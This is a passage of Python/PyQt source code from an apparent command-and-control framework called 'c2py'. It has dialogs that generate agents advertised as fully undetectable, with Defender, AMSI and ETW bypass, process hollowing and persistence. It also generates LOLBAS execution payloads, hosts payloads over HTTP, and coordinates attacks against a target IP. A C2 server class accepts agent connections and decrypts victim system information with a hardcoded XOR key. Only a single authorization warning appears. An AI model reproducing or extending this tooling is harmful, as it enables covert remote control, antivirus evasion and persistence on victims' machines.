                msg.setText("🛡️ Undetectable Agent Generated!")
                msg.setInformativeText(f"""
Agent Details:
• Target: {lhost}:{lport_int}
• File: {exe_path}
• Size: {os.path.getsize(exe_path)} bytes
• Encryption: XOR with SecureKey2024!!!
• Evasion: 2025-level anti-analysis
• Persistence: Multiple mechanisms
• Detection: Fully undetectable

The agent will:
✅ Connect to your c2py listener automatically
✅ Bypass Windows Defender and AV solutions
✅ Establish persistence on target system
✅ Use polymorphic obfuscation
✅ Implement anti-analysis techniques
                """)
                
                # Add buttons for actions
                open_folder_btn = msg.addButton("📁 Open Folder", QMessageBox.ButtonRole.ActionRole)
                show_source_btn = msg.addButton("📄 Show Source", QMessageBox.ButtonRole.ActionRole)
                copy_path_btn = msg.addButton("📋 Copy Path", QMessageBox.ButtonRole.ActionRole)
                ok_btn = msg.addButton("✅ OK", QMessageBox.ButtonRole.AcceptRole)
                
                result = msg.exec()
                
                # Handle button clicks
                if msg.clickedButton() == open_folder_btn:
                    # Open folder containing the EXE
                    folder_path = os.path.dirname(os.path.abspath(exe_path))
                    os.startfile(folder_path)
                    
                elif msg.clickedButton() == show_source_btn:
                    # Show source code in dialog
                    source_dialog = QDialog(self)
                    source_dialog.setWindowTitle("Generated Agent Source Code")
                    source_dialog.setMinimumSize(800, 600)
                    
                    layout = QVBoxLayout(source_dialog)
                    
                    source_text = QTextEdit()
                    source_text.setReadOnly(True)
                    source_text.setFont(QFont("Consolas", 10))
                    source_text.setText(source_code)
                    layout.addWidget(source_text)
                    
                    close_btn = QPushButton("Close")
                    close_btn.clicked.connect(source_dialog.accept)
                    layout.addWidget(close_btn)
                    
                    source_dialog.exec()
                    
                elif msg.clickedButton() == copy_path_btn:
                    # Copy full path to clipboard
                    QApplication.clipboard().setText(os.path.abspath(exe_path))
                    QMessageBox.information(self, "Copied", "Agent path copied to clipboard!")
                
                if self.parent:
                    self.parent.log_message(f"✅ Undetectable agent generated: {exe_path}")
                    
            else:
                # Generation failed
                QMessageBox.critical(self, "Generation Failed", 
                    "Failed to generate agent executable.\n\n"
                    "Please ensure:\n"
                    "• PyInstaller is installed (pip install pyinstaller)\n"
                    "• Required dependencies are available\n"
                    "• Write permissions to current directory\n\n"
                    "Check the console for detailed error messages.")
                
                if self.parent:
                    self.parent.log_message("❌ Agent generation failed")
                    
        except Exception as e:
            progress.close()
            QMessageBox.critical(self, "Error", f"Agent generation error:\n{str(e)}")
            if self.parent:
                self.parent.log_message(f"❌ Agent generation error: {str(e)}")


    def check_listener_status(self):
        """Check if c2py listener is running and update UI"""
        if hasattr(self.parent, 'server_thread') and self.parent.server_thread:
            if self.parent.server_thread.isRunning():
                # Listener is running
                self.start_listener_btn.setText("🟢 C2PY Listener Active")
                self.start_listener_btn.setToolTip("C2PY Listener is currently running")
                self.start_listener_btn.setStyleSheet("QPushButton { background-color: #2d5a27; }")
            else:
                # Listener is not running
                self.start_listener_btn.setText("🚀 Start C2PY Listener")
                self.start_listener_btn.setToolTip("Start c2py listener for optimal compatibility")
                self.start_listener_btn.setStyleSheet("")  # Reset to default
        else:
            # No listener thread
            self.start_listener_btn.setText("🚀 Start C2PY Listener")
            self.start_listener_btn.setToolTip("Start c2py listener for optimal compatibility")
            self.start_listener_btn.setStyleSheet("")  # Reset to default

    def generate_compiled_agent(self):
        """Generate a compiled C# agent for maximum AV evasion"""
        av_engine = AVEvasionEngine()
        
        # Get connection details
        lhost = self.lhost_input.text().strip()
        lport = self.lport_input.text().strip()
        
        if not lhost or not lport:
            QMessageBox.warning(self, "Missing Configuration", 
                              "Please configure LHOST and LPORT before generating agents.")
            return
        
        try:
            # Generate compiled agent
            result = av_engine.generate_compiled_agent(lhost, int(lport))
            
            if result['success']:
                msg = QMessageBox(self)
                msg.setWindowTitle("🔧 Compiled Agent Generated")
                msg.setIcon(QMessageBox.Icon.Information)
                msg.setText("Advanced compiled agent successfully generated!")
                msg.setDetailedText(f"""
📁 Agent Path: {result['agent_path']}
🔧 Compiler: {result['compiler']}
🛡️ AV Evasion: Maximum
🔐 Encryption: XOR + Base64
🎯 Target: {lhost}:{lport}

The compiled agent includes:
✅ Anti-debugging techniques
✅ Process hollowing capabilities  
✅ Fileless execution
✅ Polymorphic code structure
✅ AMSI bypass
✅ ETW bypass
                """)
                msg.exec()
            else:
                QMessageBox.critical(self, "Generation Failed", 
                                   f"Failed to generate compiled agent: {result['error']}")
                
        except Exception as e:
            QMessageBox.critical(self, "Error", f"Error generating compiled agent: {e}")

    def generate_lolbas_payload(self):
        """Generate LOLBAS-based payload for stealth"""
        av_engine = AVEvasionEngine()
        
        # Get connection details
        lhost = self.lhost_input.text().strip()
        lport = self.lport_input.text().strip()
        
        if not lhost or not lport:
            QMessageBox.warning(self, "Missing Configuration", 
                              "Please configure LHOST and LPORT before generating payloads.")
            return
        
        try:
            # Show LOLBAS technique selection dialog
            techniques = av_engine.get_lolbas_techniques()
            
            dialog = QDialog(self)
            dialog.setWindowTitle("🔥 Select LOLBAS Technique")
            dialog.resize(700, 500)
            layout = QVBoxLayout(dialog)
            
            info_label = QLabel("Living Off The Land Binaries - Select execution technique:")
            info_label.setStyleSheet("font-weight: bold; color: #00ff41; margin: 10px;")
            layout.addWidget(info_label)
            
            # Technique selection
            technique_list = QListWidget()
            technique_list.setStyleSheet("""
                QListWidget {
                    background-color: #2d2d2d;
                    border: 1px solid #555;
                    border-radius: 4px;
                    padding: 5px;
                    color: #ffffff;
                }
                QListWidget::item {
                    padding: 8px;
                    border-bottom: 1px solid #444;
                }
                QListWidget::item:selected {
                    background-color: #007acc;
                    border-radius: 3px;
                }
                QListWidget::item:hover {
                    background-color: #404040;
                    border-radius: 3px;
                }
            """)
            
            for technique, description in techniques.items():
                item = QListWidgetItem(f"{technique} - {description}")
                item.setData(Qt.ItemDataRole.UserRole, technique)
                technique_list.addItem(item)
            
            layout.addWidget(technique_list)
            
            # Buttons
            btn_layout = QHBoxLayout()
            
            generate_btn = QPushButton("🔥 Generate Selected")
            generate_btn.setObjectName("advancedButton")
            generate_btn.clicked.connect(lambda: self.generate_selected_lolbas(technique_list, av_engine, lhost, int(lport), dialog))
            btn_layout.addWidget(generate_btn)
            
            random_btn = QPushButton("🎲 Generate Random")
            random_btn.setObjectName("sendButton")
            random_btn.clicked.connect(lambda: self.generate_random_lolbas(av_engine, lhost, int(lport), dialog))
            btn_layout.addWidget(random_btn)
            
            help_btn = QPushButton("📚 Templates")
            help_btn.setObjectName("actionButton")
            help_btn.clicked.connect(lambda: self.show_lolbas_templates())
            btn_layout.addWidget(help_btn)
            
            cancel_btn = QPushButton("❌ Cancel")
            cancel_btn.setObjectName("stopButton")
            cancel_btn.clicked.connect(dialog.reject)
            btn_layout.addWidget(cancel_btn)
            
            layout.addLayout(btn_layout)
            dialog.exec()
                
        except Exception as e:
            QMessageBox.critical(self, "Error", f"Error generating LOLBAS payload: {e}")
    
    def generate_selected_lolbas(self, technique_list, av_engine, lhost, lport, parent_dialog):
        """Generate payload for selected LOLBAS technique"""
        current_item = technique_list.currentItem()
        if not current_item:
            QMessageBox.warning(parent_dialog, "No Selection", "Please select a LOLBAS technique.")
            return
        
        technique = current_item.data(Qt.ItemDataRole.UserRole)
        payload = av_engine.generate_specific_lolbas(technique, lhost, lport)
        
        parent_dialog.accept()
        self.show_lolbas_result(technique, payload)
    
    def generate_random_lolbas(self, av_engine, lhost, lport, parent_dialog):
        """Generate random LOLBAS payload"""
        payload = av_engine.generate_lolbas_payload(lhost, lport)
        
        parent_dialog.accept()
        self.show_lolbas_result("Random LOLBAS", payload)
    
    def show_lolbas_result(self, technique, payload):
        """Show LOLBAS payload result dialog"""
        dialog = QDialog(self)
        dialog.setWindowTitle(f"🔥 {technique} Generated")
        dialog.resize(800, 600)
        layout = QVBoxLayout(dialog)
        
        # Info label
        info_label = QLabel(f"LOLBAS Technique: {technique}")
        info_label.setStyleSheet("font-weight: bold; color: #00ff41; margin: 10px;")
        layout.addWidget(info_label)
        
        # Payload display
        text_edit = QTextEdit()
        text_edit.setFont(QFont("Consolas", 10))
        text_edit.setPlainText(payload)
        text_edit.setReadOnly(True)
        text_edit.setStyleSheet("""
            QTextEdit {
                background-color: #1e1e1e;
                border: 1px solid #555;
                border-radius: 4px;
                padding: 10px;
                color: #00ff41;
                font-family: 'Consolas', monospace;
            }
        """)
        layout.addWidget(text_edit)
        
        # Warning label
        warning_label = QLabel("⚠️  Ensure corresponding payload files are hosted at the specified URL")
        warning_label.setStyleSheet("color: #ffa500; font-style: italic; margin: 5px;")
        layout.addWidget(warning_label)
        
        # Buttons
        btn_layout = QHBoxLayout()
        
        copy_btn = QPushButton("📋 Copy to Clipboard")
        copy_btn.setObjectName("sendButton")
        copy_btn.clicked.connect(lambda: self.copy_to_clipboard(payload))
        btn_layout.addWidget(copy_btn)
        
        save_btn = QPushButton("💾 Save to File")
        save_btn.setObjectName("sendButton")
        save_btn.clicked.connect(lambda: self.save_payload_to_file(payload, f"LOLBAS_{technique}"))
        btn_layout.addWidget(save_btn)
        
        close_btn = QPushButton("✅ Close")
        close_btn.setObjectName("actionButton")
        close_btn.clicked.connect(dialog.accept)
        btn_layout.addWidget(close_btn)
        
        layout.addLayout(btn_layout)
        dialog.exec()
    
    def show_lolbas_templates(self):
        """Show LOLBAS template files and instructions"""
        dialog = QDialog(self)
        dialog.setWindowTitle("📚 LOLBAS Templates & Instructions")
        dialog.resize(900, 700)
        layout = QVBoxLayout(dialog)
        
        # Info header
        info_label = QLabel("LOLBAS Template Files - Host these files for different attack vectors:")
        info_label.setStyleSheet("font-weight: bold; color: #00ff41; margin: 10px;")
        layout.addWidget(info_label)
        
        # Tabbed interface for different templates
        tab_widget = QTabWidget()
        tab_widget.setStyleSheet("""
            QTabWidget::pane {
                border: 1px solid #555;
                background-color: #2d2d2d;
            }
            QTabBar::tab {
                background-color: #404040;
                color: #ffffff;
                padding: 8px 16px;
                margin-right: 2px;
                border: 1px solid #555;
                border-bottom: none;
            }
            QTabBar::tab:selected {
                background-color: #007acc;
                border-bottom: 1px solid #007acc;
            }
        """)
        
        # Template files content
        templates = {
            "VBScript (.vbs)": "lolbas_templates/payload.vbs",
            "SCT (.sct)": "lolbas_templates/payload.sct", 
            "HTA (.hta)": "lolbas_templates/payload.hta",
            "MSBuild (.xml)": "lolbas_templates/payload.xml",
            "Instructions": "lolbas_templates/README.md"
        }
        
        for tab_name, file_path in templates.items():
            try:
                with open(file_path, 'r', encoding='utf-8') as f:
                    content = f.read()
                
                text_edit = QTextEdit()
                text_edit.setPlainText(content)
                text_edit.setFont(QFont("Consolas", 10))
                text_edit.setReadOnly(True)
                text_edit.setStyleSheet("""
                    QTextEdit {
                        background-color: #1e1e1e;
                        border: 1px solid #555;
                        color: #ffffff;
                        font-family: 'Consolas', monospace;
                        padding: 10px;
                    }
                """)
                
                tab_widget.addTab(text_edit, tab_name)
            except Exception as e:
                # If file doesn't exist, show placeholder
                text_edit = QTextEdit()
                text_edit.setPlainText(f"Template file not found: {file_path}\nError: {e}")
                text_edit.setReadOnly(True)
                tab_widget.addTab(text_edit, tab_name)
        
        layout.addWidget(tab_widget)
        
        # Buttons
        btn_layout = QHBoxLayout()
        
        open_folder_btn = QPushButton("📁 Open Templates Folder")
        open_folder_btn.setObjectName("sendButton")
        open_folder_btn.clicked.connect(lambda: self.open_templates_folder())
        btn_layout.addWidget(open_folder_btn)
        
        close_btn = QPushButton("✅ Close")
        close_btn.setObjectName("actionButton")
        close_btn.clicked.connect(dialog.accept)
        btn_layout.addWidget(close_btn)
        
        layout.addLayout(btn_layout)
        dialog.exec()
    
    def open_templates_folder(self):
        """Open the LOLBAS templates folder in file explorer"""
        try:
            import os
            import subprocess
            
            templates_path = os.path.join(os.getcwd(), "lolbas_templates")
            
            if os.path.exists(templates_path):
                if sys.platform == "win32":
                    subprocess.run(["explorer", templates_path])
                elif sys.platform == "darwin":
                    subprocess.run(["open", templates_path])
                else:
                    subprocess.run(["xdg-open", templates_path])
            else:
                QMessageBox.warning(self, "Folder Not Found", 
                                  f"Templates folder not found: {templates_path}")
        except Exception as e:
            QMessageBox.critical(self, "Error", f"Could not open templates folder: {e}")

    def show_agent_detection(self):
        """Show agent detection capabilities"""
        av_engine = AVEvasionEngine()
        
        dialog = QDialog(self)
        dialog.setWindowTitle("🔍 Agent Type Detection")
        dialog.resize(700, 500)
        layout = QVBoxLayout(dialog)
        
        info_text = QTextEdit()
        info_text.setReadOnly(True)
        info_text.setFont(QFont("Consolas", 10))
        
        detection_info = """
🔍 AGENT TYPE DETECTION CAPABILITIES

The c2py framework automatically detects and analyzes connecting agents:

📊 DETECTION CRITERIA:
• Response format analysis (JSON, base64, plain text)
• Encryption detection (XOR, none)
• Agent capabilities assessment
• Connection stability evaluation

🎯 AGENT TYPES DETECTED:
• c2py_advanced_agent: Full-featured encrypted agents
• basic_powershell: Simple PowerShell reverse shells  
• basic_cmd: Command prompt connections
• meterpreter: Metasploit framework agents
• custom_shell: Unknown/custom implementations

⚡ STABILITY ANALYSIS:
• stable: Reliable, encrypted, feature-rich
• moderate: Basic functionality, some features
• unstable: Limited capabilities, plain text

🛡️ RECOMMENDATIONS PROVIDED:
• Agent upgrade suggestions
• Stability improvements
• Security enhancements
• Feature recommendations

💡 REAL-TIME MONITORING:
All connecting agents are automatically analyzed and categorized
for optimal command handling and stability assessment.
        """
        
        info_text.setPlainText(detection_info)
        layout.addWidget(info_text)
        
        close_btn = QPushButton("✅ Close")
        close_btn.clicked.connect(dialog.accept)
        layout.addWidget(close_btn)
        
        dialog.exec()

    def show_connection_analysis(self):
        """Show connection stability analysis"""
        dialog = QDialog(self)
        dialog.setWindowTitle("📊 Connection Analysis")
        dialog.resize(800, 600)
        layout = QVBoxLayout(dialog)
        
        # Check if there are active connections
        if hasattr(self.parent, 'server_thread') and self.parent.server_thread:
            if hasattr(self.parent.server_thread, 'clients') and self.parent.server_thread.clients:
                # Show active connections
                connections_text = QTextEdit()
                connections_text.setReadOnly(True)
                connections_text.setFont(QFont("Consolas", 10))
                
                analysis = "📊 ACTIVE CONNECTION ANALYSIS\n\n"
                
                for client_id, client_data in self.parent.server_thread.clients.items():
                    agent_info = client_data.get('agent_info', {})
                    analysis += f"🔗 Agent {client_id}:\n"
                    analysis += f"   Type: {agent_info.get('agent_type', 'unknown')}\n"
                    analysis += f"   Stability: {agent_info.get('stability', 'unknown')}\n"
                    analysis += f"   Encryption: {agent_info.get('encryption', 'none')}\n"
                    analysis += f"   Capabilities: {', '.join(agent_info.get('capabilities', ['basic']))}\n"
                    analysis += f"   Recommendation: {agent_info.get('recommendation', 'No analysis available')}\n"
                    analysis += f"   Last Seen: {client_data.get('last_seen', 'Unknown')}\n\n"
                
                connections_text.setPlainText(analysis)
                layout.addWidget(connections_text)
            else:
                # No active connections
                no_conn_label = QLabel("⚠️ No active connections to analyze")
                no_conn_label.setAlignment(Qt.AlignmentFlag.AlignCenter)
                no_conn_label.setStyleSheet("color: #888; font-size: 14px;")
                layout.addWidget(no_conn_label)
        else:
            # Listener not running
            no_listener_label = QLabel("❌ C2PY Listener not running")
            no_listener_label.setAlignment(Qt.AlignmentFlag.AlignCenter)
            no_listener_label.setStyleSheet("color: #ff6b6b; font-size: 14px;")
            layout.addWidget(no_listener_label)
        
        close_btn = QPushButton("✅ Close")
        close_btn.clicked.connect(dialog.accept)
        layout.addWidget(close_btn)
        
        dialog.exec()

    def copy_to_clipboard(self, text):
        """Copy text to clipboard"""
        clipboard = QApplication.clipboard()
        clipboard.setText(text)
        QMessageBox.information(self, "Copied", "Payload copied to clipboard!")

    def save_payload_to_file(self, payload, payload_type):
        """Save payload to file"""
        file_extensions = {
            "PowerShell LOLBAS": "ps1",
            "MSBuild LOLBAS": "xml",
            "RegSvr32 LOLBAS": "sct",
            "WScript LOLBAS": "vbs"
        }
        
        ext = file_extensions.get(payload_type, "txt")
        filename, _ = QFileDialog.getSaveFileName(self, f"Save {payload_type}", 
                                                f"lolbas_payload.{ext}", 
                                                f"{payload_type} (*.{ext});;All files (*.*)")
        
        if filename:
            try:
                with open(filename, 'w', encoding='utf-8') as f:
                    f.write(payload)
                QMessageBox.information(self, "Saved", f"Payload saved to {filename}")
            except Exception as e:
                QMessageBox.critical(self, "Error", f"Failed to save file: {e}")

    def open_attack_coordinator(self):
        """Open Attack Coordinator dialog for complete attack setup"""
        dialog = QDialog(self)
        dialog.setWindowTitle("🎯 Attack Coordinator - Automated Attack Setup")
        dialog.setMinimumWidth(900)
        dialog.setMinimumHeight(700)
        
        layout = QVBoxLayout(dialog)
        
        # Header
        header = QLabel("🎯 Attack Coordinator")
        header.setStyleSheet("font-size: 18px; font-weight: bold; color: #8b5cf6; padding: 10px;")
        layout.addWidget(header)
        
        # Target configuration
        target_group = QGroupBox("🎯 Target Configuration")
        target_layout = QFormLayout()
        
        target_ip_input = QLineEdit()
        target_ip_input.setPlaceholderText("192.168.1.100")
        target_layout.addRow("Target IP:", target_ip_input)
        
        target_os_combo = QComboBox()
        target_os_combo.addItems(["Auto-detect", "Windows 7", "Windows 10", "Windows 11", 
                                 "Windows Server 2016", "Windows Server 2019", 
                                 "Linux", "Linux 4.x", "Linux 5.x"])
        target_layout.addRow("Target OS:", target_os_combo)
        
        detect_btn = QPushButton("🔍 Auto-Detect OS")
        target_layout.addRow("", detect_btn)
        
        target_group.setLayout(target_layout)
        layout.addWidget(target_group)
        
        # Attack configuration
        attack_group = QGroupBox("⚙️ Attack Configuration")
        attack_layout = QFormLayout()
        
        lhost_input = QLineEdit(self.coordinator.get_local_ip())
        attack_layout.addRow("LHOST (Attacker):", lhost_input)
        
        lport_input = QLineEdit("4444")
        attack_layout.addRow("LPORT:", lport_input)
        
        http_port_input = QLineEdit("8080")
        attack_layout.addRow("HTTP Server Port:", http_port_input)
        
        use_lolbas_check = QCheckBox("Use LOLBAS Techniques")
        use_lolbas_check.setChecked(True)
        attack_layout.addRow("", use_lolbas_check)
        
        attack_group.setLayout(attack_layout)
        layout.addWidget(attack_group)
        
        # Results area
        results_group = QGroupBox("📋 Attack Plan")
        results_layout = QVBoxLayout()
        
        results_text = QTextEdit()
        results_text.setReadOnly(True)
        results_text.setPlaceholderText("Click 'Generate Attack Plan' to see the complete attack setup...")
        results_layout.addWidget(results_text)
        
        results_group.setLayout(results_layout)
        layout.addWidget(results_group)
        
        # Buttons
        button_layout = QHBoxLayout()
        
        generate_btn = QPushButton("🔨 Generate Attack Plan")
        button_layout.addWidget(generate_btn)
        
        start_http_btn = QPushButton("🌐 Start HTTP Server")
        start_http_btn.setEnabled(False)
        button_layout.addWidget(start_http_btn)
        
        start_listener_btn = QPushButton("🚀 Start Listener")
        start_listener_btn.setEnabled(False)
        button_layout.addWidget(start_listener_btn)
        
        button_layout.addStretch()
        
        close_btn = QPushButton("Close")
        close_btn.clicked.connect(dialog.accept)
        button_layout.addWidget(close_btn)
        
        layout.addLayout(button_layout)
        
        # Connect signals
        def detect_os():
            target = target_ip_input.text().strip()
            if not target:
                QMessageBox.warning(dialog, "Input Required", "Please enter target IP")
                return
            
            os_type, confidence = self.coordinator.detect_target_os(target)
            QMessageBox.information(dialog, "OS Detection", 
                                  f"Detected OS: {os_type}\nConfidence: {confidence}")
            
            # Try to set in combo
            for i in range(target_os_combo.count()):
                if os_type.lower() in target_os_combo.itemText(i).lower():
                    target_os_combo.setCurrentIndex(i)
                    break
        
        def generate_attack():
            target = target_ip_input.text().strip()
            target_os = target_os_combo.currentText()
            lhost = lhost_input.text().strip()
            lport = lport_input.text().strip()
            http_port = http_port_input.text().strip()
            use_lolbas = use_lolbas_check.isChecked()
            
            if not all([target, lhost, lport, http_port]):
                QMessageBox.warning(dialog, "Configuration Required", 
                                  "Please fill in all required fields")
                return
            
            try:
                lport_int = int(lport)
                http_port_int = int(http_port)
            except ValueError:
                QMessageBox.warning(dialog, "Invalid Port", "Ports must be numbers")
                return
            
            # Auto-detect if needed
            if target_os == "Auto-detect":
                target_os, _ = self.coordinator.detect_target_os(target)
            
            # Generate attack
            attack = self.coordinator.generate_complete_attack(
                target_ip=target,
                target_os=target_os,
                lhost=lhost,
                lport=lport_int,
                http_port=http_port_int,
                use_lolbas=use_lolbas
            )
            
            # Display attack plan
            plan = f"""╔═══════════════════════════════════════════════════════════╗
║           COMPLETE ATTACK PLAN GENERATED                  ║
╚═══════════════════════════════════════════════════════════╝

🎯 TARGET INFORMATION:
   • IP Address: {attack['target_ip']}
   • OS: {attack['target_os']}

📡 ATTACKER INFORMATION:
   • LHOST: {attack['lhost']}
   • LPORT: {attack['lport']}
   • HTTP Server: {attack['http_server_url']}

💡 SUGGESTED PAYLOAD:
   • Category: {attack['suggested_category']}
   • Subcategory: {attack['suggested_subcategory']}

"""
            
            if 'lolbas_commands' in attack:
                plan += """🔥 LOLBAS ATTACK COMMANDS:

"""
                for name, cmd in attack['lolbas_commands'].items():
                    plan += f"  {name.upper()}:\n  {cmd}\n\n"
            
            plan += f"""🎧 LISTENER COMMAND:
  {attack['listener_commands']['netcat']}

📝 ATTACK EXECUTION STEPS:

1. Start HTTP Server (use button below)
2. Start Listener (use button below or manually)
3. Execute one of the LOLBAS commands on target
4. Wait for connection

✅ All templates have been generated in: lolbas_templates/
✅ HTTP Server ready to serve payloads
✅ Listener commands ready

⚠️  WARNING: Only use on systems you have authorization to test!
"""
            
            results_text.setPlainText(plan)
            start_http_btn.setEnabled(True)
            start_listener_btn.setEnabled(True)
            
            # Update main dialog fields
            self.lhost_input.setText(lhost)
            self.lport_input.setText(str(lport_int))
        
        def start_http_server():
            http_port = int(http_port_input.text().strip())
            if self.coordinator.start_http_server(http_port):
                QMessageBox.information(dialog, "HTTP Server Started", 
                                      f"HTTP server is now running on port {http_port}\n"
                                      f"Templates are being served from lolbas_templates/")
                start_http_btn.setEnabled(False)
                start_http_btn.setText("✅ HTTP Server Running")
            else:
                QMessageBox.warning(dialog, "Server Error", 
                                  "Failed to start HTTP server. Port may be in use.")
        
        detect_btn.clicked.connect(detect_os)
        generate_btn.clicked.connect(generate_attack)
        start_http_btn.clicked.connect(start_http_server)
        start_listener_btn.clicked.connect(self.start_c2py_listener)
        
        dialog.exec()
    
    def open_exploit_generator(self):
        """Open Exploit Generator dialog"""
        from exploit_dialog import ExploitDialog
        dialog = ExploitDialog(self)
        dialog.exec()
    
    def toggle_http_server(self):
        """Start/stop HTTP server for LOLBAS payloads"""
        if self.coordinator.http_server_thread and self.coordinator.http_server_thread.is_alive():
            # Server is running, stop it
            self.coordinator.stop_http_server()
            self.http_server_btn.setText("🌐")
            self.http_server_btn.setToolTip("Start HTTP Server")
            QMessageBox.information(self, "HTTP Server Stopped", "HTTP server has been stopped")
        else:
            # Start server
            dialog = QDialog(self)
            dialog.setWindowTitle("HTTP Server Configuration")
            layout = QVBoxLayout(dialog)
            
            form_layout = QFormLayout()
            port_input = QLineEdit("8080")
            form_layout.addRow("Port:", port_input)
            layout.addLayout(form_layout)
            
            button_layout = QHBoxLayout()
            start_btn = QPushButton("Start")
            cancel_btn = QPushButton("Cancel")
            button_layout.addWidget(start_btn)
            button_layout.addWidget(cancel_btn)
            layout.addLayout(button_layout)
            
            def start_server():
                try:
                    port = int(port_input.text())
                    # Generate LOLBAS templates first
                    lhost = self.lhost_input.text().strip() or self.coordinator.get_local_ip()
                    lport = int(self.lport_input.text().strip() or "4444")
                    
                    self.coordinator.generate_lolbas_templates(lhost, lport, port)
                    
                    if self.coordinator.start_http_server(port):
                        self.http_server_btn.setText("🟢")
                        self.http_server_btn.setToolTip(f"HTTP Server Running on port {port}")
                        QMessageBox.information(dialog, "Server Started", 
                                              f"HTTP server started on port {port}\n"
                                              f"Serving files from lolbas_templates/")
                        dialog.accept()
                    else:
                        QMessageBox.warning(dialog, "Error", "Failed to start HTTP server")
                except ValueError:
                    QMessageBox.warning(dialog, "Invalid Port", "Port must be a number")
            
            start_btn.clicked.connect(start_server)
            cancel_btn.clicked.connect(dialog.reject)
            
            dialog.exec()


class EnhancedC2Server:
    """Enhanced C2 Server with improved encryption and stability"""
    
    def __init__(self, host='0.0.0.0', port=9999):
        self.host = host
        self.port = port
        self.server_socket = None
        self.clients = {}
        self.client_counter = 0
        self.running = False
        self.log_signal = None
        self.client_update_signal = None
        self.command_response_signal = None
        self.history_file = "command_history.json"
        self.debug_mode = True  # Enable debug logging to see what's happening
        self.load_command_history()

    def load_command_history(self):
        """Load command history from file"""
        try:
            if os.path.exists(self.history_file):
                with open(self.history_file, 'r', encoding='utf-8') as f:
                    history_data = json.load(f)
                    for client_id, client_data in self.clients.items():
                        if str(client_id) in history_data:
                            client_data['command_history'] = history_data[str(client_id)]
        except Exception as e:
            self.log(f"Error loading command history: {e}")

    def save_command_history(self):
        """Save command history to file"""
        try:
            history_data = {}
            for client_id, client_data in self.clients.items():
                if 'command_history' in client_data:
                    history_data[str(client_id)] = client_data['command_history']
            
            with open(self.history_file, 'w', encoding='utf-8') as f:
                json.dump(history_data, f, indent=2, default=str)
        except Exception as e:
            self.log(f"Error saving command history: {e}")

    def add_command_to_history(self, client_id, command, cmd_type="shell"):
        """Add command to client history"""
        if client_id not in self.clients:
            return
        
        if 'command_history' not in self.clients[client_id]:
            self.clients[client_id]['command_history'] = []
        
        history_entry = {
            'timestamp': datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
            'command': command,
            'type': cmd_type
        }
        
        self.clients[client_id]['command_history'].append(history_entry)
        
        # Keep only last 100 commands
        if len(self.clients[client_id]['command_history']) > 100:
            self.clients[client_id]['command_history'] = self.clients[client_id]['command_history'][-100:]
        
        # Save to file periodically
        if len(self.clients[client_id]['command_history']) % 10 == 0:
            self.save_command_history()

    def log(self, message):
        timestamp = datetime.now().strftime("%H:%M:%S")
        log_msg = f"[{timestamp}] {message}"
        if self.log_signal:
            self.log_signal.emit(log_msg)
        print(log_msg)

    def start_listener(self):
        try:
            self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            self.server_socket.bind((self.host, self.port))
            self.server_socket.listen(5)
            self.running = True
            
            self.log(f"Enhanced C2 Server listening on {self.host}:{self.port}")
            
            while self.running:
                try:
                    client_socket, address = self.server_socket.accept()
                    if not self.running:
                        break
                        
                    self.client_counter += 1
                    client_id = self.client_counter
                    
                    self.clients[client_id] = {
                        'socket': client_socket,
                        'address': address,
                        'info': {},
                        'last_seen': datetime.now(),
                        'status': 'Connected',
                        'agent_info': {
                            'agent_type': 'unknown',
                            'stability': 'unknown',
                            'encryption': 'none',
                            'capabilities': [],
                            'recommendation': 'Treat as basic shell'
                        }
                    }
                    
                    self.log(f"New agent connected: {address} (ID: {client_id})")
                    
                    # Start client handler thread
                    client_thread = threading.Thread(
                        target=self.handle_client,
                        args=(client_id, client_socket),
                        daemon=True
                    )
                    client_thread.start()
                    
                    if self.client_update_signal:
                        self.client_update_signal.emit()
                        
                except socket.error:
                    if self.running:
                        self.log("Socket error in accept loop")
                    break
                except Exception as e:
                    if self.running:
                        self.log(f"Error in accept loop: {e}")
                    break
                    
        except Exception as e:
            self.log(f"Failed to start server: {e}")
        finally:
            self.stop_server()

    def handle_client(self, client_id, client_socket):
        av_engine = AVEvasionEngine()
        
        # Initialize agent info with defaults
        default_agent_info = {
            'agent_type': 'unknown',
            'stability': 'unknown',
            'encryption': 'none',
            'capabilities': [],
            'recommendation': 'Treat as basic shell'
        }
        
        try:
            # Wait for initial data from client
            try:
                client_socket.settimeout(10)
                response = client_socket.recv(8192).decode('utf-8').strip()
                if response:
                    # Detect agent type and capabilities
                    try:
                        agent_info = av_engine.detect_agent_type(response)
                        self.log(f"🔍 Agent {client_id} Connection Analysis:")
                        self.log(f"   Type: {agent_info.get('agent_type', 'unknown')}")
                        self.log(f"   Stability: {agent_info.get('stability', 'unknown')}")
                        self.log(f"   Encryption: {agent_info.get('encryption', 'none')}")
                        self.log(f"   Capabilities: {', '.join(agent_info.get('capabilities', []))}")
                        self.log(f"   Recommendation: {agent_info.get('recommendation', 'Unknown')}")
                    except Exception as detect_error:
                        self.log(f"⚠️ Agent detection failed for {client_id}: {detect_error}")
                        agent_info = default_agent_info.copy()
                    
                    # Store agent information with fallback
                    self.clients[client_id]['agent_info'] = agent_info
                    
                    # Try to process as enhanced agent
                    try:
                        # Check if response looks like base64 encoded data
                        if len(response) > 50 and response.replace('+', '').replace('/', '').replace('=', '').isalnum():
                            # For enhanced agents: decode base64 then XOR decrypt
                            decoded_data = base64.b64decode(response)
                            decrypted_bytes = xor_encrypt_decrypt(decoded_data, "SecureKey2024!!!")
                            decrypted_response = decrypted_bytes.decode('utf-8', errors='replace')
                            
                            # Try to parse as JSON
                            system_info = json.loads(decrypted_response)
                            
                            self.clients[client_id]['info'] = system_info
                            
                            # Determine agent type from system info
                            agent_type = system_info.get('agent_type', 'c2py_advanced_agent')
                            if agent_type == 'enhanced_windows_agent':
                                self.log(f"✅ Enhanced Windows Agent {client_id} connected: {system_info.get('hostname', 'Unknown')} ({system_info.get('username', 'Unknown')})")
                                self.clients[client_id]['agent_info']['agent_type'] = 'enhanced_windows_agent'
                            else:
                                self.log(f"✅ Advanced Agent {client_id} authenticated: {system_info.get('hostname', 'Unknown')}")
                                self.clients[client_id]['agent_info']['agent_type'] = 'c2py_advanced_agent'
                            self.clients[client_id]['agent_info']['stability'] = 'stable'
                            self.clients[client_id]['agent_info']['encryption'] = 'xor_encrypted'
                        else:
                            # Try plain JSON first
                            system_info = json.loads(response)
                            self.clients[client_id]['info'] = system_info
                            self.log(f"✅ Plain Agent {client_id} authenticated: {system_info.get('hostname', 'Unknown')}")
